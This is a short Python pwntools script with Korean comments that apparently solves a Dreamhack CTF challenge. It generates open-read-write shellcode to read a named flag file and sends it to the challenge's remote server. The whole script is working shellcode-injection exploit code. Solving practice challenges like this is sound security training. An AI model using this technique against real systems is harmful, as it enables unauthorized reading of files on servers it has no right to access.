from pwn import *

# 사용할 아키텍처를 64비트 리눅스로 설정
context.arch = 'amd64'
context.os = 'linux'

# 문제에서 알려준 flag 파일의 전체 경로
path = '/home/shell_basic/flag_name_is_loooooong'

# ORW shellcode 생성 시작
# 1) 파일 열기
sc = shellcraft.open(path, 0)

# 2) 파일 읽기
# open의 반환값(fd)은 rax에 들어가므로 read의 첫 번째 인자로 'rax' 사용
# 읽은 데이터는 rsp를 버퍼처럼 사용해서 그 위치에 저장
sc += shellcraft.read('rax', 'rsp', 0x40)

# 3) 파일 내용 출력
# stdout은 fd=1
# rsp에 저장된 데이터를 0x40 바이트만큼 출력
sc += shellcraft.write(1, 'rsp', 0x40)

# 위에서 만든 어셈블리 문자열을 실제 쉘코드 바이트로 변환
payload = asm(sc)

# 원격 서버 연결
r = remote("host3.dreamhack.games", 13760)

# 쉘코드 전송
# sendline을 사용해서 payload 뒤에 개행도 같이 보냄
r.sendline(payload)

#뒤의 0x00 등은 무시하고 쉘코드만 decode
print(r.recvall().decode(errors='ignore'))